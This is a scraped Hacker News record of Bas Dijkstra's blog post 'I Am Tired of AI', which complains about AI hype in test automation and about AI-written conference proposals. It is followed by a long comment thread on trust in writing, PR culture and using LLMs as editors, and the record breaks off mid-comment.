[
  {
    "id": 41667652,
    "title": "I Am Tired of AI",
    "originLink": "https://www.ontestautomation.com/i-am-tired-of-ai/",
    "originBody": "Skip links Skip to primary navigation Skip to content Skip to footer Toggle menu Book time with me Training 1-on-1 training Mentoring Consulting Blog Talks Contact About Open source workshops Articles Bas Dijkstra Helping individuals, teams and organizations improve their test automation efforts Follow Amersfoort, the Netherlands Email LinkedIn GitHub I am tired of AI Unless you have been living under a rock for the last few years, you probably have seen the same massive surge I’ve seen in the application of artificial intelligence (AI) to pretty much every problem out there, in software testing, in software development, and in life in general. Now, I am all for finding and developing new solutions to existing problems, but boy, am I tired of AI, of how it is used and of how it is marketed. Every tech fart smelling of ‘AI’ these days is almost instantly labeled as a ‘game changer’, only to be replaced by the next ‘pivotal’ and ‘revolutionary’ ‘solution’ the next week. Yes, I realize that thinking like this and writing this make me a Neo-Luddite in your eyes. That’s fine. Everybody is entitled to their opinion, and this is mine. Feel free to stop reading if you’re not interested. Please note that I don’t necessarily have anything against AI itself. I’m pretty sure that there are some areas where applying AI might be useful. I use AI myself, too, albeit sparingly and with caution. That doesn’t change the fact that I’m really, really tired of most of it. Allow me to elaborate. I am tired of AI as a professional in software testing I’ve been working in testing, with a focus on test automation, for some 18 years now. In that time, several things have changed, but there is a lot that has remained pretty much the same. Full-stack end-to-end tests have always been the slowest and most expensive. To address that challenge, discussing testability has always been a cornerstone in enabling the writing of faster, smaller tests. After that, writing good automated tests has always required a working knowledge of good fundamental programming principles. There are no shortcuts to solving these problems, it takes time and experience to tackle them. Simply throwing more tools at the problem hasn’t helped so far. Yet, that’s exactly what many ‘AI-powered test automation solutions’ and similar buzzword bingo high score contenders do. If anything, these tools will produce results faster. Sometimes, that’s exactly what you’re looking for. Often, what we would really benefit from, though, is better results, not merely faster results, and I’ve not seen a lot of AI-powered tools actually produce better results, if any at all. Again, that doesn’t mean I never use AI in my work. Of course it doesn’t. If it helps me to get a result, or a suggestion towards to result, faster than using other methods, I’ll gladly use AI to do just that. But that’s exactly what AI is: a means to produce some result of indeterminate quality and value faster. I’ll still need to apply my own knowledge and experience to determine the usefulness of a result, and often also to wrangle the output so that it is actually usable. Are those AI-generated results helpful in certain cases? Absolutely. Do I trust it enough to replace what a skilled and experienced human being does? Absolutely not. But I guess that doesn’t make for sexy marketing material. I am tired of AI as a conference program committee member and organizer Over the last few years, I’ve had the honour of being the member of the program committee for three different conferences, and a one-off reviewer for one or two more. What I have seen in these years is a significant rise in proposals that were clearly written with the help of, or in many cases, entirely by ChatGPT or similar software. Is that a bad thing? Yes, I think it is, for multiple reasons. First of all, all these auto-generated proposals sound very much the same. ‘In the ever-changing world of …’. ‘Delve’. ‘Pivotal’. All words and phrases that smell suspiciously like someone used ChatGPT to write a proposal, instead of taking the time and effort to do it themselves. I don’t think that’s a great way to stand out and demonstrate your knowledge or experience of or unique take on a subject. Second of all, a proposal is your first, and often only, opportunity to show use who you are, and what your experience with or opinion on a certain topic is. Why on earth would you want to outsource that opportunity to a piece of software and reduce your unique and thoughtful ideas to a piece of run-of-the-mill text that’s dull as dishwater and about as impressive? Third of all, if you can’t even write a proposal yourself, why on that same earth would we as the program committee trust you to come up with a unique presentation? Or are you just going to read prompt results out loud for 40 minutes, too? I hope not, but we will not take the chance. It has gotten so bad that I, for one, immediately reject a proposal when it is clear that it was written by or with the help of AI, no matter how interesting the topic is or how good of a talk you will be able to deliver in person. I’m not taking the chance if you don’t put in the effort of writing a good proposal yourself, and I am pretty confident I’m not the only conference program committee member thinking that way. I am tired of AI as a human being Finally, and most of all, I am tired of AI as a human being. Like so many people, I love listening to good music. Reading a moving book. Watching a captivating movie. What makes these pieces of music, books and movies so attractive is the fact that they are created by human beings, and that these human beings transported their thoughts, their feelings and their emotions to the sheet music, the book manuscript or the movie script. There’s no way that creative process and the result can be replicated by AI, or at least, I haven’t seen it. What I have seen, though, is a lot of dull AI-generated posts on social media, with dull AI-generated images, and even more dull AI-generated comments. I’ve seen and heard examples of texts, videos and music that were generated by AI, and while technically impressive, it doesn’t even begin to evoke the same kind of emotional reaction in me that pieces of art and other human creations can, unless you count boredom as an emotion. Meanwhile… people are scared that AI is going to take their jobs companies continue to blindly throw ridiculous sums of money towards the next AI prodigy without ever seeing a decent ROI, and AI’s carbon footprint is reaching more alarming levels every day I honestly don’t think we’re moving in the right direction this way. Again, there are some cases where AI is used as a force for good. Early detection of diseases, for example. That’s great. That’s progress. We should definitely keep using AI to do that, and try to make it even better. But I’m pretty sure I can do without all that AI-generated music, images, text, conference proposals, test cases, LinkedIn posts and so much other AI-generated nonsense. \" Email LinkedIn GitHub © 2024 Bas Dijkstra. Powered by Jekyll & Minimal Mistakes.",
    "commentLink": "https://news.ycombinator.com/item?id=41667652",
    "commentBody": "I Am Tired of AI (ontestautomation.com)732 points by Liriel 10 hours agohidepastfavorite705 comments low_tech_love 9 hours agoThe most depressing thing for me is the feeling that I simply cannot trust anything that has been written in the past 2 years or so and up until the day that I die. It's not so much that I think people have used AI, but that I know they have with a high degree of certainty, and this certainty is converging to 100%, simply because there is no way it will not. If you write regularly and you're not using AI, you simply cannot keep up with the competition. You're out. And the growing consensus is \"why shouldn't you?\", there is no escape from that. Now, I'm not going to criticize anyone that does it, like I said, you have to, that's it. But what I had never noticed until now is that knowing that a human being was behind the written words (however flawed they can be, and hopefully are) is crucial for me. This has completely destroyed my interest in reading any new things. I guess I'm lucky that we have produced so much writing in the past century or so and I'll never run out of stuff to read, but it's still depressing, to be honest. reply Roark66 7 hours agoparent>The most depressing thing for me is the feeling that I simply cannot trust anything that has been written in the past 2 years or so and up until the day that I die Do you think AI has changed that in any way? I remember the sea of excrement overtaking genuine human written content on the Internet around mid 2010s. It is around that time when Google stopped pretending they are a search company and focused on their primary business of advertising. Before, at least they were trying to downrank all the crap \"word aggregators\". After, they stopped caring at all. AI gives even better tools to page rank. Detection of AI generated content is not that bad. So why don't we have \"a new Google\" emerge? Simple, because of the monopolistic practices Google did to make the barrier to entry huge. First, 99% of the content people want to search for is behind a login wall (Facebook, Instagram, twitter, YouTube), second almost all CDNs now implement \"verify you are human\" by default. Third, no one links to other sites. Ever! These 3 things mean a new Google is essentially impossible. Even duck duck go has thrown the towel and subscribed to Bing results. It has nothing to do with AI, and everything to do with Google. In fact AI might give us the tools to better fight Google. reply TheOtherHobbes 5 hours agorootparentGoogle didn't change it, it embodied it. The problem isn't AI, it's the pervasive culture of PR and advertising which appeared in the 50s and eventually consumed its host. Western industrial culture was based on substance - getting real shit done. There was always a lot of scammery around it, but the bedrock goal was to make physical things happen - build things, invent things, deliver things, innovate. PR and ad culture was there to support that. The goal was to change values and behaviours to get people to Buy More Stuff. OK. Then around the time the Internet arrived, industry was off-shored, and the culture started to become one of appearance and performance, not of substance and action. SEO, adtech, social media, web framework soup, management fads - they're all about impression management and popularity games, not about underlying fundamentals. This is very obvious on social media in the arts. The qualification for a creative career used to be substantial talent and ability. Now there are thousands of people making careers out of performing the lifestyle of being a creative person. Their ability to do the basics - draw, write, compose - is very limited. Worse, they lack the ability to imagine anything fresh or original - which is where the real substance is in art. Worse than that, they don't know what they don't know, because they've been trained to be superficial in a superficial culture. It's just as bad in engineering, where it has become more important to create the illusion of work being done, than to do the work. (Looking at you, Boeing. And also Agile...) You literally make more money doing this. A lot more. So AI isn't really a tool for creating substance. It's a tool for automating impression management. You can create the impression of getting a lot of work done. Or the impression of a well-written cover letter. Or of a genre novel, techno track, whatever. AI might one day be a tool for creating substance. But at the moment it's reflecting and enabling a Potemkin busy-culture of recycled facades and appearances that has almost nothing real behind it. Unfortunately it's quite good at that. But the problem is the culture, not the technology. And it's been a problem for a long time. reply techdmn 3 hours agorootparentThank you, you've stated this all very clearly. I've been thinking about this in terms of \"doing work\", where you care about the results, and \"performing work\", where you care about how you are evaluated. I know someone who works in a lab, and pointed out that some of the equipment being used was out of spec and under-serviced to the point that it was essentially a random number generator. Caring about this is \"doing work\". However, pointing it out made that person the enemy of the greater cohort that was \"performing work\". The results were not important to them, their metrics about units of work completed was. I see this pattern frequently. And it's hard to say those \"performing work\" are wrong. \"Performing\" is rewarded, \"doing\" is punished - Perhaps right to the top, as many companies are involved in a public performance designed to affect the short-term stock price. reply trilobyte 31 minutes agorootparentThis is a pretty clear summary of a real problem in most work environments. I have some thoughts about why, but I'm holding onto your articulation to ruminate on in the future. reply rjbwork 3 hours agorootparentprevYeah. It's like our entire society has been turned into a Goodhart's Law based simulacrum of a productive society. I mean, here it's late morning and I'm commenting on hacker news. And getting paid for it. reply llm_trw 26 minutes agorootparentprev>Western industrial culture was based on substance - getting real shit done. There was always a lot of scammery around it, but the bedrock goal was to make physical things happen - build things, invent things, deliver things, innovate. For a very short period between 1945 to 1980 while the generation who remembered the great depression and WWII was in charge. It's been longer since that's not been the case. And it wasn't the case for most of history before then. reply 1dom 3 hours agorootparentprevI like this take on modern tech motivations. The thing that I struggle with is I agree with it, but I also get a lot of value in using AI to make me more productive - to me, it feels like it lets me focus on producing substance and actions, freeing me up from having to some tedious things in some tedious ways. Without getting into the debate about if it's productive overall, there are certain tasks which it feels irrefutably fast and effective at (e.g. writing tests). I do agree with the missing substance with modern generative AI: everyone notices when it's producing things in that uncanny valley, and if no human is there to edit that, it makes people uncomfortable. The only way I can reconcile the almost existential discomfort of AI against my actual day-to-day generally-positive experience with AI is to accept that AI in itself isn't the problem. Ultimately, it is an info tool, and human nature makes people spam garbage for clicks with it. People will do the equivalent of spam garbage for clicks with any new modern thing, unfortunately. Getting the most out of latest information of a society has probably always been a cat and mouse game of trying to find the areas where the spam-garbage-for-clicks people haven't outnumbered use-AI-to-facilitate-substance people, like here, hopefully. reply skydhash 2 hours agorootparentJust one nitpick. The thing about test is that it’s repetitive enough to be automated (in a deterministic way) or abstracted into a framework. You don’t need an AI to generate it. reply closeparen 1 hour agorootparentWhile I occasionally have the pleasure of creating or working with a test suite that's interesting and creative relative to the code under test, the vast majority of unit tests by volume are slop. Does it call the mock? Does it use the return value? Does \"if err != nil { return err }\" in fact stop and return the error? This stuff is a perfect candidate for LLM generation. reply closeparen 1 hour agorootparentprevYou can outfit an adult life with all of the useful manufactured objects that would reasonably improve it for a not-very-impressive sum. Beyond that it's just clutter (going for quantity) or moving into the lifestyle/taste/social-signaling domain anyway (going for quality). There is just not an unlimited amount of alpha in making physical things. The social/thought/experiential domain is a much bigger opportunity. reply deephoneybear 2 hours agorootparentprevEchoing other comments in gratitude for this very clear articulation of feelings I share, but have not manifested so well. Just wanted to add two connected opinions that round out this view. 1) This consuming of the host is only possible on the one hand because the host has grown so strong, that is the modern global industrial economy is so efficient. The doing stuff side of the equation is truly amazing and getting better (some real work gets done either by accident or those who have not-succumbed to PR and ad culture), and even this drop of \"real work\" produces enough material wealth to support (at least a lot of) humanity. We really do live in a post scarcity world from a production perspective, we just have profound distribution and allocation problems. 2) Radical wealth inequality profoundly exacerbates the problem of PR and ad culture. If everyone has some wealth doing things that help many people live more comfortably is a great way to become wealthy. But if very few people have wealth, then doing a venture capital FOMO hustle on the wealthy is anyone's best ROI. Radical wealth inequality eventually breaks all the good aspects of capitalist/market economies. reply rich_sasha 7 hours agorootparentprevSome great grand ancestor of mine was a civil servant, a great achievement given his peasant background. The single skill that enabled it was the knowledge of calligraphy. He went to school and wrote nicely and that was sufficient. The flip side was, calligraphy was sufficient evidence for both his education to whoever hired him, and for a recipient of a document, of its official nature. Calligraphy itself or course didn't make him efficient or smart or fair. That's long gone of course, but we had similar heuristics. I am reminded of the Reddit story about an AI-generated mushroom atlas that had factual errors and lead to someone getting poisoned. We can no longer assume that a book is legit simply because it looks legit. The story of course is from reddit, so probably untrue, but it doesn't matter - it totally could be true. LLMs are fantastic at breaking our heuristics as to what is and isn't legit, but not as good at being right. reply matwood 6 hours agorootparent> We can no longer assume that a book is legit simply because it looks legit. The problem is that this has been an issue for a long time. My first interactions with the internet in the 90s came along with the warning \"don't automatically trust what you read on the internet\". I was speaking to a librarian the other day who teaches incoming freshman how to use LLMs. What was shocking to me is that the librarian said a majority of the kids trust what the computer says by default. Not just LLMs, but generally what they read. That's such a huge shift from my generation. Maybe LLM education will shift people back toward skepticism - unlikely, but I can hope. reply honzabe 4 hours agorootparent> I was speaking to a librarian the other day who teaches incoming freshman how to use LLMs. What was shocking to me is that the librarian said a majority of the kids trust what the computer says by default. Not just LLMs, but generally what they read. That's such a huge shift from my generation. I think that previous generations were not any different. For most people, trusting is the default mode and you need to learn to distrust a source. I know many people who still have not learned that about the internet in general. These are often older people. They believe insane things just because there exists a nicely looking website claiming that thing. reply mrweasel 4 hours agorootparentprevOne of the issues today is the volume of content produced, and that journalism and professional writing is dying. LLMs produce large amounts of \"good enough\" quality to make a profit. In the 90s we could reasonably trust that that the major news sites and corporate websites was true, while random forums required a bit more critical reading. Today even formerly trusted sites may be using LLMs to generate content along with automatic translations. I wouldn't necessarily put the blame on LLMs, this just make it easier. The trolls and spammers was always there, now they just have a more powerful tool. The commercial sites now have a tool they don't understand, which they apply liberally, because it reduces cost, or their staff use it, to get out of work, keep up with deadlines or to cover up incompetence. So, not the fault of the LLMs, but their use is worsening existing trends. reply SllX 33 minutes agorootparentprev> The problem is that this has been an issue for a long time. My first interactions with the internet in the 90s came along with the warning \"don't automatically trust what you read on the internet\". I received the same warnings, actually it was more like “don’t trust everything you read on the internet”, but it quickly became apparent that the last three words were redundant, and could have been rephrased more accurately as “don’t trust everything you read and hear and see”. Our parents and teachers were living with their own fallacious assumptions and we just didn’t know it at the time, but most information is very pliable. If you can’t change what someone sees, then you can probably change how they see it. reply llm_trw 5 hours agorootparentprev>That's long gone of course, but we had similar heuristics. To quote someone about this: >>All that is solid melts into air, all that is holy is profaned, and man is at last compelled to face with sober senses his real conditions of life. A book looking legit, a paper being peer reviewed, an expert saying something, none of those things were _ever_ good heuristics. It's just that it was the done thing. Now we have to face the fact that our heuristics are obviously broken and we have to start thinking about every topic. To quote someone else about this: >>Most people would rather die than think. Which explains neatly the politics of the last 10 years. reply hprotagonist 5 hours agorootparent> To quote someone about this: >>All that is solid melts into air, all that is holy is profaned, and man is at last compelled to face with sober senses his real conditions of life. So, same as it ever was? Smoke, nothing but smoke. [That’s what the Quester says.] There’s nothing to anything—it’s all smoke. What’s there to show for a lifetime of work, a lifetime of working your fingers to the bone? One generation goes its way, the next one arrives, but nothing changes—it’s business as usual for old planet earth. The sun comes up and the sun goes down, then does it again, and again—the same old round. The wind blows south, the wind blows north. Around and around and around it blows, blowing this way, then that—the whirling, erratic wind. All the rivers flow into the sea, but the sea never fills up. The rivers keep flowing to the same old place, and then start all over and do it again. Everything’s boring, utterly boring— no one can find any meaning in it. Boring to the eye, boring to the ear. What was will be again, what happened will happen again. There’s nothing new on this earth. Year after year it’s the same old thing. Does someone call out, “Hey, this is new”? Don’t get excited—it’s the same old story. Nobody remembers what happened yesterday. And the things that will happen tomorrow? Nobody’ll remember them either. Don’t count on being remembered. c. 450BC reply wwweston 4 hours agorootparentCuld be my KJV upbringing talking, but personally I think there's an informative quality to calling it \"vanity\" over smoke. And there's more reasons not to simply compare the modern challenges of image and media with the ancient grappling with impermanence. Tech may only truly change the human condition rarely, but it frequently magnifies some aspect of it, sometimes so much that the quantitative change becomes a qualitative one. And in this case, what we're talking about isn't just impermanence and mortality and meaning as the preacher/quester is. We'd be lucky if it's business as usual for old planet earth, but we've managed to magnify our ability to impact our environment with tech to the point where winds, rivers, seas, and other things may well change drastically. And as for \"smoke\", it's one thing if we're dust in the wind, but when we're dust we can trust, that enables continuity and cooperation. There's always been reasons for distrust, but with media scale, the liabilities are magnified, and now we've automated some of them. The realities of human nature that are the seeds of the human condition are old. But some of the technical and social machinery we have made to magnify things is new, and we can and will see new problems. reply hprotagonist 3 hours agorootparent'הבל (hevel)' has the primary sense of vapor, or mist -- a transient thing, not a meaningless or purposeless one. reply llm_trw 5 hours agorootparentprevOne is a complaint that everything is constantly changing, the other that nothing ever changes. I don't think you could misunderstand what either is trying to say harder if you tried. reply hprotagonist 5 hours agorootparent\"everything is constantly changing!\" is the thing that never changes. reply llm_trw 4 hours agorootparentYou sound like a poorly trained gpt2 model. reply failbuffer 3 hours agorootparentprevHeuristics don't have to be perfect to be useful so long as they improve the efficacy of our attentions. Once that breaks down society must follow because thinking about every topic is intractable. reply ziml77 4 hours agorootparentprevThe mushroom thing is almost certainly true. There's tons of trash AI generated foraging books being published to Amazon. Atomic Shrimp has a video on it. reply sevensor 6 hours agorootparentprev> Some great grand ancestor of mine was a civil servant, a great achievement given his peasant background. The single skill that enabled it was the knowledge of calligraphy. He went to school and wrote nicely and that was sufficient. Similar story! Family lore has it that he was from a farming family of modest means, but he was hired to write insurance policies because of his beautiful handwriting, and this was a big step up in the world. reply newswasboring 5 hours agorootparentprev> The story of course is from reddit, so probably untrue, but it doesn't matter - it totally could be true. What?! Someone just made up something and then got mad at it. This is specially weird when you even acknowledge its a made up story. If we start evaluating new things like this nothing will ever progress. reply bad_user 6 hours agorootparentprevYou're attributing too much to Google. Bots are now blocked because they've been abusive. When you host content on the internet, it's not fun to have bots bring your server down or inflate your bandwidth price. Google's bot is actually quite well-behaved. The other problem has been the recent trend in AI, and I can understand blockers being put in place, since AI is essentially plagiarizing content without attribution. But I'd blame OpenAI more at this point. I also don't think you can blame Google for the centralization behind closed gardens. Or for why people no longer link to other websites. That's ridiculous. And you should be attributing them the fact that the web is still alive. reply dennis_jeeves2 5 hours agorootparentprev>I remember the sea of excrement overtaking genuine human written content on the Internet around mid 2010s. Things have not changed much really. This was true since the dawn of man-kind (and woman-kind from the man-kind rib of course) even before there writings was invented, in the form of gossip. The internet/AI now carries on the torch of our ancestral inner calling, lol. reply ninetyninenine 5 hours agorootparentprev> I remember the sea of excrement overtaking genuine human written content on the Internet around mid 2010s. I mean the AI is trained and modeled on this excrement. It makes sense. As much as people think AI content is raw garbage… they don’t realize that they are staring into a mirror. reply elnasca2 9 hours agoparentprevWhat fascinates me about your comment is that you are expressing that you trusted what you read before. For me, LLMs don't change anything. I already questioned the information before and continue to do so. Why do you think that you could trust what you read before? Is it now harder for you to distinguish false information, and if so, why? reply nicce 9 hours agorootparentIn the past, you had to put a lot of effort to produce a text which seemed to be high quality, especially when you knew nothing about the subject. By the look of text and the usage of the words, you could tell how professional the writer was and you had some confidence that the writer knew something about the subject. Now, that is completely removed. There is no easy filter anymore. While the professional looking text could have been already wrong, the likelihood was smaller, since you usually needed to know something at least in order to write convincing text. reply ookdatnog 8 hours agorootparentWriting a text of decent quality used to constitute proof of work. This is now no longer the case, and we haven't adapted to this assumption becoming invalid. For example, when applying to a job, your cover letter used to count as proof of work. The contents are less important than the fact that you put some amount of effort in it, enough to prove that you care about this specific vacancy. Now this basic assumption has evaporated, and job searching has become a meaningless two-way spam war, where having your AI-generated application selected from hundreds or thousands of other AI-generated applications is little more than a lottery. reply bitexploder 8 hours agorootparentThis. I am very picky about how I use ML still, but it is unsurpassed as a virtual editor. It can clean up grammar and rephrase things in a very light way, but it gives my prose the polish I want. The thing is, I am a very decent writer. I wrote professionally for 18 years as a part of my job delivering reports of high quality as my work product. So, it really helps that I know exactly what “good” looks like by my standards. ML can clean things up so much faster than I can and I am confident my writing is organic still, but it can fix up small issues, find mistakes, etc very quickly. A word change here or there, some punctuation, that is normal editing. It is genuinely good at light rephrasing as well, if you have some idea of what intent you want. When it becomes obvious, though, is when people let the LLM do the writing for them. The job search bit is definitely rough. Referrals, references, and actual accomplishments may become even more important. reply gtirloni 7 hours agorootparentAs usual, LLMs are an excellent tool when you already have a decent understanding of the field you're interested in using them in. Which is not the case of people posting in social media or creating their first programs. That's where the dullness and noise come from. The noise ground has been elevated 100x by LLMs. It was already bad before but it's accelerated the trend. So, yes, we should have never been trusting anything online but before LLMs we could rely on our brains to quickly identify the bad. Nowadays, it's exhausting. Maybe we need a LLM trained on spotting LLMs. This month, I, with decades of experience, used Claude Dev as an experiment to create a small automation tool. After countless manual fixes, it finally worked and I was happy. Until I gave thr whole thing a decent look again and realized what a piece of garbage I had created. It's exhausting to be on the lookout for these situations. I prefer to think things through myself, it's a more rewarding experience with better end results anyway. reply danielbln 3 hours agorootparentNot to sound too dismissive, but there is a distinct learning curve when it comes to using models like Claude for code assist. Not just the intuition when the model goes off the rails, but also what to provide it in the context, how and what to ask for etc. Trying it once and dismissing it is maybe not the best experimental setup. I've been using Zed recently with its LLM integration so assist me in my development and its been absolutely wonderful, but one must control tightly what to present to the model and what to ask for and how. reply gtirloni 3 hours agorootparentIt's not my first time using LLMs and you're assuming too much. reply iszomer 6 hours agorootparentprevLLM's are a great onramp to filling in knowledge that may have been lost to age or updated to their modern classification. For example, I didn't know Hokkien and Haka are distinct linguistic branches within the Sino-Tibetan language and warrants more (personal) research into the subject. And all this time, without the internet, we often just colloquially called it Taiwanese. reply aguaviva 5 hours agorootparentHow is this considered \"lost\" knowledge there are (large) Wikipedia pages about those languages (which is of course what the LLM is cribbing from)? \"Human-curated encycolpedias are a great onramp to filling in knowledge gaps\", that I can go with. reply nicce 5 hours agorootparentIt is lost in a sense that you had no idea about such possibility and you did not know to search it in the first hand, while I believe that in this case LLM brought it up as a side note. reply aguaviva 3 hours agorootparentSuch fortuitous stumblings happen all the time without LLMs (and in regular libraries, for those brave enough to use them). It's just the natural byproduct of doing any kind of research. reply skydhash 2 hours agorootparentMost of my knowledge comes from physical encyclopedia and download the wikipedia text dump (internet was not readily available). You search for one thing and just explore by clicking. reply dotnet00 5 hours agorootparentprevYeah, this is how I use it too. I tend to be a very dry writer, which isn't unusual in science, but lately I've taken to writing, then asking an LLM to suggest improvements. I know not to trust it to be as precise as good research papers need to be, so I don't take its output, it usually helps me reorder points or use different transitions which make the material much more enjoyable to read. I also find it useful for helping to come up with an opening sentence from which to start writing a section. reply bitexploder 3 hours agorootparentActive voice is difficult in technical and scientific writing for sure :) reply rasulkireev 2 hours agorootparentprevGreat opportunity to get ahead of all the lazy people who use AI for a cover letter. Do a video! Sure, AI will be able to do that soon, but then we (not lazy people, who care) will come up with something even more personal! reply roenxi 9 hours agorootparentprev> While the professional looking text could have been already wrong, the likelihood was smaller... I don't criticise you for it, because that strategy is both rational and popular. But you never checked the accuracy of your information before so you have no way of telling if it has gotten more or less accurate with the advent of AI. You were testing for whether someone of high social intelligence wanted you to believe what they said rather than if what they said was true. reply dietr1ch 8 hours agorootparentI guess the complaint is about losing this proxy to gain some assurance for little cost. We humans are great at figuring out the least amount of work that's good enough. Now we'll need to be fully diligent, which means more work, and also there'll be way more things to review. reply wlesieutre 5 hours agorootparentThere’s not enough time in the day to go on a full bore research project about every sentence I read, so it’s not physically possible to be “fully diligent.” The best we can hope for is prioritizing which things are worth checking. But even that gets harder because you go looking for sources and now those are increasingly likely to be LLM spam. reply roenxi 8 hours agorootparentprevI'd argue people clearly don't care about the truth at all - they care about being part of a group and that is where it ends. It shows up in things like critical thinking being a difficult skill acquired slowly vs social proof which humans just do by reflex. Makes a lot of sense, if there are 10 of us and 1 of you it doesn't matter how smartypants you may be when the mob forms. AI does indeed threaten people's ability to identify whether they are reading work by a high status human and what the group consensus is - and that is a real problem for most people. But it has no bearing on how correct information was in the past vs will be in the future. Groups are smart but they get a lot of stuff wrong in strategic ways (it is almost a truism that no group ever identifies itself or its pursuit of its own interests as the problem). reply Jensson 8 hours agorootparent> I'd argue people clearly don't care about the truth at all Plenty of people care about the truth in order to get advantages over the ignorant. Beliefs aren't just about fitting in a group, they are about getting advantages and making your life better, if you know the truth you can make much better decisions than those who are ignorant. Similarly plenty of people try to hide the truth in order to keep people ignorant so they can be exploited. reply rendall 7 hours agorootparent> if you know the truth you can make much better decisions than those who are ignorant There are some fallacious hidden assumptions there. One is that \"knowing the truth\" equates to better life outcomes. I'd argue that history shows more often than not that what one knows to be true best align with prevailing consensus if comfort, prosperity and peace is one's goal, even if that consensus is flat out wrong. The list is long of lone geniuses who challenged the consensus and suffered. Galileo, Turing, Einstein, Mendel, van Gogh, Darwin, Lovelace, Boltzmann, Gödel, Faraday, Kant, Poe, Thoreau, Bohr, Tesla, Kepler, Copernicus, et. al. all suffered isolation and marginalization of some degree during their lifetimes, some unrecognized until after their death, many living in poverty, many actively tormented. I can't see how Turing, for instance, had a better life than the ignorant who persecuted him despite his excellent grasp of truth. reply Jensson 7 hours agorootparentYou are thinking too big, most of the time the truth is whether a piece of food is spoiled or not etc, and that greatly affects your quality of life. Companies would love to keep you ignorant here so they can sell you literal shit, so there are powerful forces wanting to keep you ignorant, and today those powerful forces has way stronger tools than ever before working to keep you ignorant. reply roenxi 7 hours agorootparentprevSocrates is also a big name. Never forget. reply danmaz74 4 hours agorootparentprevYou're implying that there is an absolute Truth and that people only need to do [what?] to check if something is True. But that's not True. We only have models of how reality works, and every model is wrong - but some are useful. When dealing with almost everything you do day by day, you have to rely on the credibility of the source of the information you have. Otherwise how could you know that the can of tuna you're going to eat is actually tuna and not some venomous fish? How do you know that you should do what your doctor told you? Etc. etc. reply svieira 3 hours agorootparent> You're implying that there is an absolute Truth and that people only need to do [what?] to check if something is True. But that's not True. We only have models of how reality works, and every model is wrong - but some are useful. But isn't your third sentence True? reply SoftTalker 2 hours agorootparentprevIn the past, with a printed book or journal article, it was safe to assume that an editor had been involved, to some degree or another challenging claimed facts, and the publisher also had an interest in maintaining their reputation by not publishing poorly researched or outright false information. You would also have reviewers reading and reacting to the book in many cases. All of that is gone now. You have LLMs spitting their excrement directly onto the web without so much as a human giving it a once-over. reply quietbritishjim 8 hours agorootparentprevHow do you \"check the accuracy of your information\" if all the other reliable-sounding sources could also be AI generated junk? If it's something in computing, like whether something compiles, you can sometimes literally check for yourself, but most things you read about are not like that. reply glenstein 7 hours agorootparentprev>But you never checked the accuracy of your information before so They didn't say that and that's not a fair or warranted extrapolation. They're talking about a heuristic that we all use, as a shorthand proxy that doesn't replace but can help steer the initial navigation in the selection of reliable sources, which can be complemented with fact checking (see the steelmanning I did there?). I don't think someone using that heuristic can be interpreted as tantamount to completely ignoring facts, which is a ridiculous extrapolation. I also think is misrepresents the lay of the land, which is that in the universe of nonfiction writing, I don't think that there's a fire hose of facts and falsehoods indistinguishable in tone. I think there's in fact a reasonably high correlation between the discernible tone of impersonal professional and credible information, which, again (since this seems to be a difficult sticking point) doesn't mean that the tone substitutes for the facts which still need to be verified. The idea that information and misinformation are tonally indistinguishable is, in my experience, only something believed by post-truth \"do you own research\" people who think there are equally valid facts in all directions. There's not, for instance, a Science Daily of equally sciency sounding misinformation. There's not a second different IPCC that publishes a report with thousands of citations which are all wrong, etc. Misinformation is out there but it's not symmetrical, and understanding that it's not symmetrical is an important aspect of information literacy. This is important because it goes to their point, which is that something has changed, in the advent of LLMS. That symmetry may be coming, and it's precisely the fact that it wasn't there before that is pivotal. reply cutemonster 8 hours agorootparentprevInteresting points! Doesn't sound impossible with an AI that's wrong less often than an average human author (if the AIs training data was well curated). I suppose a related problem is that we can't know if the human who posted the article, actually agrees with it themselves. (Or if they clicked \"Generate\" and don't actually care, or even have different opinions) reply jackthetab 7 hours agorootparentprev> While the professional looking text could have been already wrong, the likelihood was smaller, since you usually needed to know something at least in order to write convincing text. https://en.wikipedia.org/wiki/Michael_Crichton#Gell-Mann_amn... reply mewpmewp2 6 hours agorootparentprevAlthough, there were already before tons of \"technical influencers\" before that who excelled at writing, but didn't know deeply what they were writing about. They give a superficially smart look, but really they regurgitate without deep understanding. reply factormeta 7 hours agorootparentprev>In the past, you had to put a lot of effort to produce a text which seemed to be high quality, especially when you knew nothing about the subject. By the look of text and the usage of the words, you could tell how professional the writer was and you had some confidence that the writer knew something about the subject. Now, that is completely removed. There is no easy filter anymore. That is pretty much true also for other media, such as audio and video. Before digital stuff become mainstream pics are developed in the darkroom, and film are actually cut with scissors. A lot of effort are put into producing the final product. AI has really commoditized for many brain related tasks. We must realize the fragile nature of digital tech and still learn how to do these by ourselves. reply gizmo 8 hours agorootparentprevI think you overestimate the value of things looking professional. The overwhelming majority of books published every year are trash, despite all the effort that went into research, writing, and editing them. Most news is trash. Most of what humanity produces just isn't any good. An top expert in his field can leave a typo-riddled comment in a hurry that contains more valuable information than a shelf of books written on the subject by lesser minds. AIs are good at writing professional looking text because it's a low bar to clear. It doesn't require much intelligence or expertise. reply herval 8 hours agorootparent> AIs are good at writing professional looking text because it's a low bar to clear. It doesn't require much intelligence or expertise. AIs are getting good at precisely imitating your voice with a single sample as reference, or generating original music, or creating video with all sorts of impossible physics and special effects. By your rationale, nothing “requires much intelligence or expertise”, which is patently false (even for text writing) reply gizmo 6 hours agorootparentMy point is that writing a good book is vastly more difficult than writing a mediocre book. The distance between incoherent babble and a mediocre book is smaller than the distance between a mediocre book and a great book. Most people can write professional looking text just by putting in a little bit of effort. reply bitexploder 8 hours agorootparentprevI think you underestimate how high that bar is, but I will grant that it isn’t that high. It can be a form of sophistry all of its own. Still, it is a difficult skill to write clearly, simply, and without a lot of extravagant words. reply mewpmewp2 6 hours agorootparentprevAlthough presently at least it's still quite obvious when something is written by AI. reply chilli_axe 5 hours agorootparentit's obvious when text has been produced by chatGPT with the default prompt - but there's probably loads of text on the internet which doesn't follow AI's usual prose style that blends in well. reply ImHereToVote 8 hours agorootparentprevSo content produced by think tanks was credible by default, since think tanks are usually very well funded. Interesting perspective reply diggan 8 hours agorootparentprev> By the look of text and the usage of the words, you could tell how professional the writer was and you had some confidence that the writer knew something about the subject How did you know this unless you also had the same or more knowledge than the author? It would seem to me we are as clueless now as before about how to judge how skilled a writer is without requiring to already posses that very skill ourselves. reply ffsm8 8 hours agorootparentprevTrust as no bearing on what they said. Reading was a form of connecting with someone. Their opinions are bound to be flawed, everyone's are - but they're still the thoughts and words of a person. This is no longer the case. Thus, the human factor is gone and this reduces the experience to some of us, 